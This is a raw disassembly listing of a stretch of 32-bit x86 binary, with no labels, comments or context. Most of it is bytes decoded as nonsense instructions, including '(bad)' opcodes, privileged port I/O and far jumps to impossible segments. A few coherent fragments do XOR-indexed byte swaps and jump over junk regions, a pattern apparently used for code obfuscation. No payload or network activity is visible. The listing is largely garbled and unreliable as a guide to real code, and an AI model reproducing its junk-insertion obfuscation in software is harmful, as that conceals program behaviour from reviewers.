  408ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408baa:	xchg   edx,eax
  408bab:	jae    0x408bc2
  408bad:	das    
  408bae:	sahf   
  408baf:	mov    cl,0x30
  408bb1:	jnp    0x408b5e
  408bb3:	test   BYTE PTR [esi],dh
  408bb5:	jb     0x408b50
  408bb7:	retf   
  408bb8:	and    ebx,DWORD PTR [ebp+0x6190981a]
  408bbe:	in     eax,dx
  408bbf:	in     al,dx
  408bc0:	sub    al,0x4c
  408bc2:	pop    ebx
  408bc3:	aad    0xf9
  408bc5:	add    DWORD PTR [esi],eax
  408bc7:	les    eax,FWORD PTR [ebp-0x52]
  408bca:	mov    eax,0x9dffd14e
  408bcf:	mov    dl,0x8b
  408bd1:	adc    al,0x15
  408bd3:	scas   eax,DWORD PTR es:[edi]
  408bd4:	fdiv   QWORD PTR [ecx]
  408bd6:	fsubrp st(1),st
  408bd8:	mov    ah,0x5f
  408bda:	shr    eax,0xec
  408bdd:	mov    al,0x67
  408bdf:	jmp    0x4f26:0x9e4cef23
  408be6:	xor    al,cl
  408be8:	test   DWORD PTR [eax+edi*4],eax
  408beb:	ja     0x408b7a
  408bed:	cmp    al,0xe3
  408bef:	imul   DWORD PTR [esp+edi*1-0x114f3c12]
  408bf6:	push   edi
  408bf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bf8:	or     al,0x4b
  408bfa:	inc    edx
  408bfb:	push   ecx
  408bfc:	jecxz  0x408c4d
  408bfe:	std    
  408bff:	mov    bl,0x7c
  408c01:	push   0x24
  408c03:	sub    eax,0x5670f6bb
  408c08:	mov    DWORD PTR [ebx+0x408d966e],esp
  408c0e:	inc    ecx
  408c0f:	fbld   TBYTE PTR [edx]
  408c11:	rol    ah,cl
  408c13:	fnstsw WORD PTR [ebp+0x74]
  408c16:	xchg   edi,eax
  408c17:	fisttp WORD PTR [ebx+0x36]
  408c1a:	push   ss
  408c1b:	pop    edi
  408c1c:	and    eax,0x64bfa187
  408c21:	pushf  
  408c22:	push   ebp
  408c23:	loop   0x408bc6
  408c25:	fwait
  408c26:	cwde   
  408c27:	in     eax,dx
  408c28:	loop   0x408c02
  408c2a:	mov    ebp,0x3cc5dc99
  408c2f:	sbb    edx,ebx
  408c31:	adc    ebp,DWORD PTR [edx+0x46]
  408c34:	clc    
  408c35:	push   ebp
  408c36:	fst    DWORD PTR [esi]
  408c38:	dec    edx
  408c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c3a:	xor    DWORD PTR [edi-0x77],0x30
  408c3e:	push   ebp
  408c3f:	lods   eax,DWORD PTR ds:[esi]
  408c40:	outs   dx,BYTE PTR ds:[esi]
  408c41:	imul   edi,esp,0xcf8a445c
  408c47:	xor    al,0x22
  408c49:	mov    ch,0x36
  408c4b:	cmp    ch,BYTE PTR [edx+0x1e347dcb]
  408c51:	jno    0x408c03
  408c53:	ret    
  408c54:	fcom   DWORD PTR [edx+0x20]
  408c57:	xor    al,0xbc
  408c59:	sbb    eax,DWORD PTR ds:0x5418b75
  408c5f:	mov    dh,0x5
  408c61:	xor    al,0xfe
  408c63:	data16 aam 0xa0
  408c66:	push   edx
  408c67:	je     0x408c25
  408c69:	out    dx,al
  408c6a:	jl     0x408c09
  408c6c:	cli    
  408c6d:	mov    dl,0x20
  408c6f:	daa    
  408c70:	rcl    bh,cl
  408c72:	fmul   DWORD PTR [edx+0x63213bd]
  408c78:	leave  
  408c79:	inc    edi
  408c7a:	mov    bh,0xcc
  408c7c:	pop    es
  408c7d:	mov    ah,0x45
  408c7f:	push   cs
  408c80:	xor    BYTE PTR [ebp+0x77],bl
  408c83:	pop    esi
  408c84:	pop    ebx
  408c85:	pusha  
  408c86:	and    DWORD PTR [ebp-0x5b],0xbe74e4b7
  408c8d:	pop    edi
  408c8e:	jecxz  0x408cda
  408c90:	push   edi
  408c91:	adc    al,0xf0
  408c93:	popa   
  408c94:	outs   dx,BYTE PTR ds:[esi]
  408c95:	mov    edx,0xcb814f5b
  408c9a:	push   es
  408c9b:	repnz and DWORD PTR [ecx-0x2b],0xf6ff229a
  408ca3:	push   es
  408ca4:	jae    0x408cb3
  408ca6:	shl    BYTE PTR [edi+0x67],cl
  408ca9:	dec    esp
  408caa:	add    DWORD PTR [ebx*1+0xccfa905],ecx
  408cb1:	hlt    
  408cb2:	push   eax
  408cb3:	mov    ecx,0xb82b79a3
  408cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cb9:	jbe    0x408c48
  408cbb:	pop    edi
  408cbc:	cdq    
  408cbd:	xor    ebp,edi
  408cbf:	xor    edi,DWORD PTR [edx+0x46340cd4]
  408cc5:	repnz loope 0x408cbb
  408cc8:	jmp    0x408d0a
  408cca:	inc    edi
  408ccb:	out    dx,al
  408ccc:	pop    ebx
  408ccd:	mul    DWORD PTR [eax]
  408ccf:	pop    esi
  408cd0:	xor    dh,ch
  408cd2:	mov    dh,0xac
  408cd4:	rol    BYTE PTR [ebp+0x6ef39d91],cl
  408cda:	loopne 0x408d4a
  408cdc:	mov    eax,ds:0x87b5f0c3
  408ce1:	inc    ebx
  408ce2:	xor    al,0x1
  408ce4:	mov    dh,0x5e
  408ce6:	mov    BYTE PTR [ecx],dh
  408ce8:	pop    esp
  408ce9:	stos   BYTE PTR es:[edi],al
  408cea:	pusha  
  408ceb:	sbb    BYTE PTR [ecx+esi*4+0x25],ah
  408cef:	stos   DWORD PTR es:[edi],eax
  408cf0:	mov    esp,DWORD PTR [edx+ebx*4-0x67]
  408cf4:	std    
  408cf5:	call   0x6891b3c8
  408cfa:	stc    
  408cfb:	imul   esp,ebx,0xffffffa8
  408cfe:	push   ebx
  408cff:	and    BYTE PTR [ebp-0x42e6ec26],dh
  408d05:	push   ecx
  408d06:	rcr    DWORD PTR [eax+0x53fe2b58],1
  408d0c:	mov    ecx,0x3508f60b
  408d11:	fs hlt 
  408d13:	(bad)  
  408d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d15:	jbe    0x408d80
  408d17:	mov    edi,0xc88dc4a5
  408d1c:	push   edi
  408d1d:	xchg   esi,eax
  408d1e:	scas   eax,DWORD PTR es:[edi]
  408d1f:	jnp    0x408ca2
  408d21:	aad    0x4e
  408d23:	inc    edx
  408d24:	into   
  408d25:	ins    DWORD PTR es:[edi],dx
  408d26:	inc    esp
  408d27:	adc    ah,BYTE PTR [ebp+0x61]
  408d2a:	imul   ecx
  408d2c:	xchg   DWORD PTR [esi+0x197a1ba5],ebp
  408d32:	pop    es
  408d33:	leave  
  408d34:	jmp    0xf14d:0x195b59e0
  408d3b:	ficomp DWORD PTR [esi-0x395a46e3]
  408d41:	shl    DWORD PTR [ebx-0x25eef5bb],0x60
  408d48:	jnp    0x408cfe
  408d4a:	inc    edx
  408d4b:	sub    al,0xfe
  408d4d:	push   esi
  408d4e:	mov    ds:0x646f549b,al
  408d53:	jle    0x408cf7
  408d55:	aam    0x38
  408d57:	loop   0x408ce4
  408d59:	cs dec ebx
  408d5b:	shl    BYTE PTR [esi-0x6bab707c],1
  408d61:	push   edx
  408d62:	and    ah,BYTE PTR [eax-0x1bbf1ec7]
  408d68:	sti    
  408d69:	das    
  408d6a:	and    al,0x76
  408d6c:	dec    esp
  408d6d:	aam    0x79
  408d6f:	(bad)  
  408d70:	mov    eax,ds:0x51b6e529
  408d75:	jbe    0x408d41
  408d77:	or     dl,BYTE PTR [eax+0x73a7247d]
  408d7d:	rep outs dx,BYTE PTR ds:[esi]
  408d7f:	adc    ecx,ebx
  408d81:	pop    ecx
  408d82:	pop    ss
  408d83:	mov    ds:0xd825a9,eax
  408d88:	rol    DWORD PTR [ecx],1
  408d8a:	add    bh,BYTE PTR [eax+ecx*1+0x3c]
  408d8e:	repnz add al,0x14
  408d91:	neg    DWORD PTR [edi]
  408d93:	icebp  
  408d94:	mov    edx,DWORD PTR [ebp-0xc]
  408d97:	xor    edx,eax
  408d99:	add    edx,DWORD PTR [ebp-0x14]
  408d9c:	mov    edi,DWORD PTR [ebp-0x1c]
  408d9f:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408da6:	mov    BYTE PTR [ebp+0xb],dl
  408da9:	jmp    0x408fbd
  408dae:	bound  ebp,QWORD PTR [ebx-0xa]
  408db1:	popf   
  408db2:	cmc    
  408db3:	mov    eax,ds:0xc8827371
  408db8:	cdq    
  408db9:	ins    BYTE PTR es:[edi],dx
  408dba:	cmp    DWORD PTR [edi-0x3b],0x5e
  408dbe:	xchg   ebx,eax
  408dbf:	fidiv  WORD PTR [eax+0x70]
  408dc2:	imul   edi,DWORD PTR [edi+0x70],0x9c00570
  408dc9:	and    al,0xde
  408dcb:	dec    eax
  408dcc:	or     cl,cl
  408dce:	inc    edi
  408dcf:	lea    edx,[esi+0x41]
  408dd2:	inc    ecx
  408dd3:	sub    edi,DWORD PTR [edi-0x3e584cf]
  408dd9:	hlt    
  408dda:	skinit 
  408ddd:	lahf   
  408dde:	dec    edi
  408ddf:	xlat   BYTE PTR ds:[ebx]
  408de0:	fstp   DWORD PTR [edi-0x16b79293]
  408de6:	sbb    ebx,ebp
  408de8:	adc    BYTE PTR [ebp+0x42],0xd7
  408dec:	xchg   ebx,eax
  408ded:	aas    
  408dee:	imul   ecx,ecx,0xffffffcb
  408df1:	es (bad) 
  408df3:	(bad)  
  408df4:	out    dx,eax
  408df5:	dec    ebp
  408df6:	or     al,al
  408df8:	aad    0xf
  408dfa:	push   eax
  408dfb:	mov    ecx,0xc22408ca
  408e00:	sub    al,0xdc
  408e02:	cmp    BYTE PTR [edx-0x36],0x21
  408e06:	xchg   esi,eax
  408e07:	mov    eax,0xeb0d0048
  408e0c:	sub    eax,0x8a31abba
  408e11:	loopne 0x408d98
  408e13:	les    esp,FWORD PTR [ecx]
  408e15:	(bad)  
  408e17:	mov    esi,0xee7d2209
  408e1c:	push   esi
  408e1d:	ret    0x40bb
  408e20:	cmp    DWORD PTR [eax+0x5e70348c],ebx
  408e26:	pop    edi
  408e27:	inc    ecx
  408e28:	das    
  408e29:	test   BYTE PTR [eax-0x5f],ch
  408e2c:	stos   BYTE PTR es:[edi],al
  408e2d:	jmp    0x408dc1
  408e2f:	out    0xd4,eax
  408e31:	xchg   edx,eax
  408e32:	xchg   ebp,eax
  408e33:	jp     0x408dc7
  408e35:	imul   edi,DWORD PTR [edx-0x432a8a53],0x53c8a3c8
  408e3f:	repz cmp DWORD PTR [edi],ecx
  408e42:	stos   DWORD PTR es:[edi],eax
  408e43:	push   ds
  408e44:	jmp    0x408e71
  408e46:	inc    ebx
  408e47:	adc    al,BYTE PTR [ebx]
  408e49:	xor    eax,0x768a26d
  408e4e:	jae    0x408e6c
  408e50:	sbb    DWORD PTR ds:[edi+0x5d],esp
  408e54:	push   edi
  408e55:	shl    BYTE PTR [ebp+0x2a],0xbc
  408e59:	push   ds
  408e5a:	je     0x408e98
  408e5c:	aaa    
  408e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e5e:	call   0x6c51:0xd971b953
  408e65:	mov    edi,0x3fca3475
  408e6a:	ja     0x408ea1
  408e6c:	cmp    eax,0x8d6c28d7
  408e71:	cs loope 0x408eaa
  408e74:	jae    0x408e55
  408e76:	aad    0xf3
  408e78:	fld    QWORD PTR [esi]
  408e7a:	jns    0x408e18
  408e7c:	mov    ds:0xc1107aa8,eax
  408e81:	pop    ebx
  408e82:	xchg   ebp,eax
  408e83:	xchg   edi,eax
  408e84:	rcr    edi,cl
  408e86:	add    eax,0xd9b2d83c
  408e8b:	jb     0x408e3f
  408e8d:	and    BYTE PTR [ebp+ebp*8-0x573a4b83],bh
  408e94:	test   DWORD PTR [esi+esi*2-0x5a],edi
  408e98:	mov    bh,0xd4
  408e9a:	and    cl,ah
  408e9c:	neg    BYTE PTR [ebx-0x16af7938]
  408ea2:	push   ss
  408ea3:	out    0x10,al
  408ea5:	xchg   dl,ch
  408ea7:	dec    ebp
  408ea8:	adc    BYTE PTR [ecx],dl
  408eaa:	adc    DWORD PTR [edx+eiz*2+0x3e],eax
  408eae:	std    
  408eaf:	int3   
  408eb0:	data16 add BYTE PTR [ebp+0x2d9ae6b],0x5e
  408eb8:	ins    DWORD PTR es:[edi],dx
  408eb9:	pushf  
  408eba:	frstor [eax+0x4f]
  408ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ebe:	arpl   cx,di
  408ec0:	popf   
  408ec1:	jns    0x408f2b
  408ec3:	mov    ds:0x8381553f,eax
  408ec8:	push   es
  408ec9:	pop    ds
  408eca:	jecxz  0x408e86
  408ecc:	push   0x70
  408ece:	xchg   esp,eax
  408ecf:	nop
  408ed0:	pusha  
  408ed1:	mov    WORD PTR [ecx],gs
  408ed3:	gs adc al,0x2
  408ed6:	jecxz  0x408f45
  408ed8:	push   ds
  408ed9:	xchg   DWORD PTR [ebx-0x8de7dc6],esp
  408edf:	xchg   esi,eax
  408ee0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  408ee2:	and    eax,0xe1c986b4
  408ee7:	xor    ebx,DWORD PTR [eax]
  408ee9:	inc    esp
  408eea:	jno    0x408f52
  408eec:	lgs    esi,FWORD PTR [ebx+eax*1]
  408ef0:	mov    cl,0xe5
  408ef2:	arpl   bp,sp
  408ef4:	daa    
  408ef5:	or     eax,0x40203da5
  408efa:	bound  edx,QWORD PTR [ecx-0x34]
  408efd:	sub    eax,0x32c3f655
  408f02:	and    dh,BYTE PTR [edx-0x4d]
  408f05:	mov    esp,0x58e5ca51
  408f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f0b:	adc    BYTE PTR [esp+ebp*2-0x5ac66261],bh
  408f12:	adc    eax,0x2666a891
  408f17:	sbb    ah,BYTE PTR [ebx-0x6a50b237]
  408f1d:	mov    cl,0x78
  408f1f:	sub    al,0x53
  408f21:	in     al,0x90
  408f23:	faddp  st(3),st
  408f25:	inc    esi
  408f26:	mov    bl,0xc
  408f28:	inc    eax
  408f29:	stc    
  408f2a:	pusha  
  408f2b:	or     DWORD PTR [esi],ecx
  408f2d:	jbe    0x408fa9
  408f2f:	bound  ebp,QWORD PTR [ebp+0x7]
  408f32:	pop    ds
  408f33:	xchg   esi,eax
  408f34:	fimul  WORD PTR [edi+ebx*1]
  408f37:	sar    DWORD PTR [esi+0x1b15c5f7],0x8c
  408f3e:	adc    DWORD PTR [edx],ebx
  408f40:	push   ecx
  408f41:	jmp    0x408f52
  408f43:	repz sbb DWORD PTR [ebp-0x55],0x6
  408f48:	shl    bl,1
  408f4a:	pop    es
  408f4b:	jo     0x408f17
  408f4d:	mov    cl,BYTE PTR [esi+0x44a05b36]
  408f53:	mov    ebp,DWORD PTR [eax-0x6]
  408f56:	xchg   esi,eax
  408f57:	dec    ebx
  408f58:	inc    ebp
  408f59:	jae    0x408fc0
  408f5b:	inc    ebp
  408f5c:	mov    BYTE PTR [ebx-0x692f6b09],ah
  408f62:	dec    edi
  408f63:	cli    
  408f64:	out    dx,al
  408f65:	lahf   
  408f66:	pop    ss
  408f67:	and    cl,cl
  408f69:	jo     0x408f54
  408f6b:	aad    0x6b
  408f6d:	pop    es
  408f6e:	popf   
  408f6f:	bound  eax,QWORD PTR [edi+0x3348de9]
  408f75:	rol    BYTE PTR [ebp+0x61],1
  408f78:	or     DWORD PTR [ebp+0x77],0xfffffff1
  408f7c:	lea    edi,[ebx]
  408f7e:	inc    esi
  408f7f:	push   esi
  408f80:	mov    eax,0xcd29a5fa
  408f85:	adc    ebx,edx
  408f87:	stos   DWORD PTR es:[edi],eax
  408f88:	popa   
  408f89:	xchg   esi,eax
  408f8a:	jne    0x408f76
  408f8c:	cwde   
  408f8d:	mov    DWORD PTR [esi+eiz*4],0x3c482696
  408f94:	pop    eax
  408f95:	dec    edi
  408f96:	fdivp  st(0),st
  408f98:	int3   
  408f99:	lahf   
  408f9a:	mov    ebx,0x350e179b
  408f9f:	xlat   BYTE PTR ds:[ebx]
  408fa0:	(bad)  
  408fa1:	shl    BYTE PTR [edi-0x36],0xcf
  408fa5:	and    BYTE PTR [eax+0x2548058a],0x1a
  408fac:	das    
  408fad:	adc    al,0x56
  408faf:	cs stc 
  408fb1:	outs   dx,BYTE PTR ds:[esi]
  408fb2:	dec    edx
  408fb3:	and    ebp,DWORD PTR [edx+0x25]
  408fb6:	jp     0x408f86
  408fb8:	arpl   WORD PTR [esi-0x69],dx
  408fbb:	cmp    edi,ecx
  408fbd:	mov    dl,BYTE PTR [ebp+0xf]
  408fc0:	mov    edi,DWORD PTR [ebp-0xc]
  408fc3:	xor    edi,eax
  408fc5:	add    edi,DWORD PTR [ebp-0x14]
  408fc8:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fcb:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fd2:	mov    dl,BYTE PTR [ebp+0xb]
  408fd5:	mov    edi,DWORD PTR [ebp-0x18]
  408fd8:	xor    edi,eax
  408fda:	add    edi,DWORD PTR [ebp-0x14]
  408fdd:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fe0:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fe7:	mov    edx,DWORD PTR [ebp-0x44]
  408fea:	mov    edi,DWORD PTR [ebp-0xc]
  408fed:	xor    edx,eax
  408fef:	xor    edi,eax
  408ff1:	add    edx,ecx
  408ff3:	jmp    0x409207
  408ff8:	or     ah,bh
  408ffa:	das    
  408ffb:	mov    ?,ecx
  408ffd:	push   esi
  408ffe:	test   eax,0xbb5c4a63
  409003:	into   
  409004:	sbb    ch,BYTE PTR [esi-0x23730f62]
  40900a:	jo     0x40907c
  40900c:	imul   edi,DWORD PTR [edi+0x70],0x25a39470
  409013:	loope  0x40906e
  409015:	dec    esi
  409017:	rol    DWORD PTR [esi],cl
  409019:	out    dx,eax
  40901a:	cdq    
  40901b:	cmp    DWORD PTR [ebx+0x6e],eax
  40901e:	stos   DWORD PTR es:[edi],eax
  40901f:	out    0x53,eax
  409021:	adc    ebx,DWORD PTR [edi]
  409023:	cmp    ebp,eax
  409025:	dec    ecx
  409026:	mov    ebx,esp
  409028:	gs leave 
  40902a:	cld    
  40902b:	push   ebp
  40902c:	jl     0x40908f
  40902e:	ror    DWORD PTR [ebx-0x10],1
  409031:	in     eax,0xc9
  409033:	das    
  409034:	xchg   BYTE PTR [esp],dh
  409037:	dec    edx
  409038:	jl     0x408fc2
  40903a:	inc    ecx
  40903b:	push   es
  40903c:	pop    ds
  40903d:	pop    esp
  40903e:	mov    BYTE PTR [ebx],al
  409040:	or     al,0xdc
  409042:	jp     0x409047
  409044:	cwde   
  409045:	imul   ebp,edi,0xffffffdb
  409048:	cmp    DWORD PTR [edi],ebx
  40904a:	adc    bh,ch
  40904c:	ins    DWORD PTR es:[edi],dx
  40904d:	sub    BYTE PTR [ebp+ecx*4-0x3f3a2e75],ah
  409054:	int3   
  409055:	add    edi,DWORD PTR [edi+0x421782f3]
  40905b:	push   eax
  40905c:	out    0x89,eax
  40905e:	and    BYTE PTR [edi-0x494d292a],bh
  409064:	inc    ebp
  409065:	fld    TBYTE PTR [ebp+0x1058a15b]
  40906b:	fwait
  40906c:	add    DWORD PTR [esi-0x6b],0x5e
  409070:	shl    ebx,cl
  409072:	mov    DWORD PTR [esp+esi*8],ebx
  409075:	mov    al,ds:0x34c6b3f3
  40907a:	push   ss
  40907b:	jb     0x409078
  40907d:	jecxz  0x40902c
  40907f:	mov    ?,WORD PTR [eax-0x7a]
  409082:	loopne 0x4090d6
  409084:	ror    DWORD PTR [eax],1
  409086:	pop    esp
  409087:	lahf   
  409088:	lods   eax,DWORD PTR ds:[esi]
  409089:	sbb    DWORD PTR [ebp+ebx*2-0x65959ae1],edx
  409090:	dec    edi
  409091:	test   eax,0x6fbbd712
  409096:	sbb    esp,DWORD PTR [ebx-0x6ab24e97]
  40909c:	inc    edx
  40909d:	arpl   WORD PTR [eax+0x6a],sp
  4090a0:	jmp    0x409063
  4090a2:	push   esi
  4090a3:	push   cs
  4090a4:	fwait
  4090a5:	leave  
  4090a6:	(bad)  
  4090a7:	fidiv  DWORD PTR [edx-0x73]
  4090aa:	mov    ah,0x72
  4090ac:	(bad)  
  4090ae:	dec    ecx
  4090af:	sub    al,0xf0
  4090b1:	pop    ebp
  4090b2:	jno    0x409116
  4090b4:	inc    ecx
  4090b5:	retf   0xc91e
  4090b8:	xchg   edx,eax
  4090b9:	aad    0x54
  4090bb:	or     ebp,edi
  4090bd:	xchg   ebx,eax
  4090be:	hlt    
  4090bf:	inc    edx
  4090c0:	sti    
  4090c1:	push   eax
  4090c2:	ds out 0x42,al
  4090c5:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4090c7:	or     al,0xda
  4090c9:	iret   
  4090ca:	rol    BYTE PTR [eax-0x68],1
  4090cd:	js     0x4090ff
  4090cf:	pop    es
  4090d0:	arpl   WORD PTR [ecx-0x75],dx
  4090d3:	pop    eax
  4090d4:	add    al,bh
  4090d6:	sahf   
  4090d7:	fisubr WORD PTR [ebp+0x585c934d]
  4090dd:	push   edx
  4090de:	into   
  4090df:	out    0x50,al
  4090e1:	inc    ebx
  4090e2:	ror    esp,1
  4090e4:	sub    DWORD PTR [edx+0x35],edx
  4090e7:	mov    bl,0xe3
  4090e9:	pop    ecx
  4090ea:	shr    ecx,cl
  4090ec:	mov    edi,0x50fd9b8e
  4090f1:	sbb    dl,BYTE PTR [esi]
  4090f3:	push   ebp
  4090f4:	sbb    bl,BYTE PTR [ebp+0x0]
  4090f7:	cmc    
  4090f8:	dec    ebp
  4090f9:	ss mov esi,0x7f20251f
  4090ff:	cli    
  409100:	dec    edx
  409101:	aam    0x2d
  409103:	gs pushf 
  409105:	ins    BYTE PTR es:[edi],dx
  409106:	popf   
  409107:	add    BYTE PTR [ecx+0x6c],0x80
  40910b:	fnstsw WORD PTR ds:0x759b034e
  409111:	aam    0xd2
  409113:	shr    dh,1
  409115:	cdq    
  409116:	cmc    
  409117:	jns    0x409195
  409119:	or     ch,BYTE PTR [ebx+ecx*2+0xd]
  40911d:	fisub  WORD PTR [ebx-0x16]
  409120:	gs or  eax,0x4fe56b98
  409126:	test   eax,0xabf1b6e2
  40912b:	cmp    al,0xeb
  40912d:	jge    0x4090fc
  40912f:	mov    al,BYTE PTR [edx+0x7762b0d8]
  409135:	pop    esp
  409136:	in     eax,0x32
  409138:	push   edi
  409139:	fst    QWORD PTR [edi+0x29751c81]
  40913f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409140:	mov    WORD PTR [eax-0x4a],?
  409143:	mov    esp,0x5e840805
  409148:	and    eax,0x23f0e117
  40914d:	add    BYTE PTR [ebx],ah
  40914f:	adc    edi,DWORD PTR [ecx]
  409151:	mov    ah,0x34
  409153:	mov    WORD PTR [ecx],gs
  409155:	ja     0x409181
  409157:	out    dx,eax
  409158:	xor    bl,BYTE PTR [esp+ebx*2]
  40915b:	sar    BYTE PTR [edx],1
  40915d:	pop    es
  40915e:	xlat   BYTE PTR ds:[ebx]
  40915f:	test   eax,0xbb55b5e6
  409164:	nop/reserved BYTE PTR [edi+0x67]
  409168:	cmp    esi,edi
  40916a:	jae    0x4091b8
  40916c:	call   0x2caa:0x742308be
  409173:	cdq    
  409174:	xor    esp,DWORD PTR [ebx+edi*2+0x37]
  409178:	mov    ?,WORD PTR [ebp-0x7f]
  40917b:	test   BYTE PTR [eax+0x6a],al
  40917e:	jl     0x409199
  409180:	popa   
  409181:	imul   edi,edi,0x6a
  409184:	jns    0x409156
  409186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409187:	add    eax,0x5eda1a1c
  40918c:	lods   eax,DWORD PTR ds:[esi]
  40918d:	jb     0x40913e
  40918f:	jo     0x409136
  409191:	jle    0x409163
  409193:	sub    ch,BYTE PTR [esi]
  409195:	pop    es
  409196:	cmp    al,0xf8
  409198:	xor    DWORD PTR [eax+0x4d],edi
  40919b:	xor    ebx,DWORD PTR [ebx+0x19]
  40919e:	fisttp WORD PTR [ebx+0x7169ae09]
  4091a4:	fiadd  WORD PTR [eax-0x12a9135f]
  4091aa:	xor    edi,DWORD PTR [eax+0x8]
  4091ad:	jmp    0xf831:0xbd7471f3
  4091b4:	lods   al,BYTE PTR ds:[esi]
  4091b5:	mov    al,0xc6
  4091b7:	sub    DWORD PTR [esi+0x1ee9ebd0],edi
  4091bd:	adc    al,0x75
  4091bf:	daa    
  4091c0:	or     ch,ah
  4091c2:	aas    
  4091c3:	xchg   DWORD PTR [ebx],eax
  4091c5:	ss pop edi
  4091c7:	out    0x69,eax
  4091c9:	cmp    eax,edx
  4091cb:	fistp  WORD PTR [eax]
  4091cd:	dec    ebp
  4091cf:	retf   
  4091d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091d1:	sahf   
  4091d2:	test   eax,0x37007f6f
  4091d7:	(bad)  
  4091d8:	(bad)  
  4091da:	sub    eax,0x38e5d662
  4091df:	xchg   edx,eax
  4091e0:	or     DWORD PTR [edi],0xffffffeb
  4091e3:	sar    BYTE PTR ds:0x298bd528,1
  4091e9:	pop    ecx
  4091ea:	or     DWORD PTR [esi-0x1f],0xffffffcf
  4091ee:	scas   eax,DWORD PTR es:[edi]
  4091ef:	std    
  4091f0:	ficomp WORD PTR [esi]
  4091f2:	pop    esi
  4091f3:	fwait
  4091f4:	jbe    0x409250
  4091f6:	aam    0x9f
  4091f8:	out    dx,eax
  4091f9:	inc    ecx
  4091fa:	sbb    al,0x10
  4091fc:	pop    edx
  4091fd:	aaa    
  4091fe:	push   cs
  4091ff:	pop    ss
  409200:	push   0xffffffe8
  409202:	aad    0xc
  409204:	mov    al,0xbf
  409206:	lods   al,BYTE PTR ds:[esi]
  409207:	add    edi,ecx
  409209:	jmp    0x40941d
  40920e:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  409215:	cdq    
  409216:	js     0x4091b8
  409218:	mov    ah,0x66
  40921a:	add    eax,DWORD PTR [eax+edi*8]
  40921d:	or     al,0x85
  40921f:	fidiv  DWORD PTR [eax+0x70]
  409222:	imul   edi,DWORD PTR [edi+0x70],0x86d78a70
  409229:	add    eax,0xdaa041ea
  40922e:	xor    BYTE PTR [eax],al
  409230:	sbb    dl,BYTE PTR [eax+0x16]
  409233:	mov    ss,WORD PTR [ebx+0xc]
  409236:	inc    eax
  409237:	je     0x40926a
  409239:	xchg   esi,eax
  40923a:	fninit 
  40923c:	fcom   QWORD PTR [ebp+0x3b]
  40923f:	xchg   ebx,eax
  409240:	xor    eax,0xc97b996a
  409245:	push   edx
  409246:	(bad)  
  409247:	lods   eax,DWORD PTR ds:[esi]
  409248:	pop    edx
  409249:	retf   
  40924a:	jmp    0xffff:0xbe3ff3f
  409251:	jbe    0x4091e6
  409253:	and    DWORD PTR [ebp-0x11d91737],0xffffffd2
  40925a:	inc    ebx
  40925b:	test   eax,0xb8545c84
  409260:	or     bl,BYTE PTR ss:[esi]
  409263:	mov    BYTE PTR [esi+0x282a275b],dh
  409269:	enter  0xfcec,0x51
  40926d:	dec    ebp
  40926e:	cmc    
  40926f:	lds    esp,FWORD PTR ds:0x618e3670
  409275:	or     esi,esp
  409277:	and    al,0xe0
  409279:	ds out 0xcd,eax
  40927c:	(bad)  
  40927d:	(bad)  
  40927e:	dec    edx
  40927f:	mov    bh,0xba
  409281:	jmp    0x6fbf:0x16843c9c
  409288:	inc    edx
  409289:	pop    edx
  40928a:	jbe    0x40927c
  40928c:	es test al,0x13
  40928f:	adc    ah,BYTE PTR [ebx]
  409291:	sub    BYTE PTR [eax],dh
  409293:	xchg   esp,esi
  409295:	lods   eax,DWORD PTR ds:[esi]
  409296:	lea    ecx,[edx+ebx*8]
  409299:	mov    ch,0x11
  40929b:	mov    bl,0x4
  40929d:	xchg   ebp,eax
  40929e:	iret   
  40929f:	stos   DWORD PTR es:[edi],eax
  4092a0:	call   0x5b50:0xd448a197
  4092a7:	mov    bh,0xa1
  4092a9:	(bad)  
  4092aa:	imul   ebx,DWORD PTR [edx+0x11993382],0x53
  4092b1:	test   esp,ecx
  4092b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092b4:	xor    dl,bh
  4092b6:	(bad)  
  4092b8:	in     eax,0xa4
  4092ba:	inc    ecx
  4092bb:	jns    0x40927f
  4092bd:	sub    eax,0xce0f8fa2
  4092c2:	leave  
  4092c3:	ret    0x891a
  4092c6:	leave  
  4092c7:	fstp   TBYTE PTR [ebx+0x454269c1]
  4092cd:	out    0x9e,eax
  4092cf:	test   eax,0x1bb69870
  4092d4:	inc    edx
  4092d5:	in     al,0x95
  4092d7:	shl    DWORD PTR [ebp-0x27],0x10
  4092db:	pushf  
  4092dc:	mov    DWORD PTR [ecx-0x17],ebx
  4092df:	popf   
  4092e0:	test   eax,0x5a250471
  4092e5:	stos   BYTE PTR es:[edi],al
  4092e6:	or     ebp,DWORD PTR [eax]
  4092e8:	aaa    
  4092e9:	add    BYTE PTR [edi-0x28],bl
  4092ec:	cmp    BYTE PTR [edi],0x22
  4092ef:	push   esp
  4092f0:	xchg   DWORD PTR [edi-0x16],esi
  4092f3:	ins    BYTE PTR es:[edi],dx
  4092f4:	popa   
  4092f5:	sub    edi,DWORD PTR [ebp+0x76]
  4092f8:	adc    BYTE PTR [esi-0x49e46e69],ch
  4092fe:	push   ebp
  4092ff:	in     eax,0x70
  409301:	pop    esp
  409302:	pushf  
  409303:	mov    eax,ds:0xfe3cb480
  409308:	das    
  409309:	loop   0x409378
  40930b:	cmp    al,cl
  40930d:	add    bl,BYTE PTR [eax]
  40930f:	dec    edi
  409310:	dec    edi
  409311:	sub    BYTE PTR [esi],al
